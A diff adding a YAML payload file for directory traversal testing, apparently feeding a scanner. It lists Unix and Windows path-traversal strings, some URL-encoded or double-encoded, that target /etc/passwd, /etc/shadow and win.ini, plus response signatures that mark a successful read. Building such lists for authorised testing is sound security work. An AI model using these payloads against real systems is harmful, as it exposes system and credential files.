@@ -1,0 +1,31 @@
+# directory traversal payloads
+unix:
+  - "../../../etc/passwd"
+  - "../../../../etc/passwd"
+  - "../../../../../etc/passwd"
+  - "../../../../../../etc/passwd"
+  - "../../../etc/shadow"
+  - "../../../etc/hosts"
+  - "....//....//....//etc/passwd"
+  - "..%2f..%2f..%2fetc%2fpasswd"
+  - "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+  - "..%252f..%252f..%252fetc%252fpasswd"
+  - "/etc/passwd"
+  - "....\\....\\....\\etc\\passwd"
+
+windows:
+  - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+  - "..\\..\\..\\..\\windows\\win.ini"
+  - "....\\\\....\\\\....\\\\windows\\\\win.ini"
+  - "..%5c..%5c..%5cwindows%5cwin.ini"
+
+# signatures indicating successful traversal
+success_signatures:
+  - "root:"
+  - "daemon:"
+  - "/bin/bash"
+  - "/bin/sh"
+  - "[extensions]"
+  - "[fonts]"
+  - "localhost"
+  - "127.0.0.1"
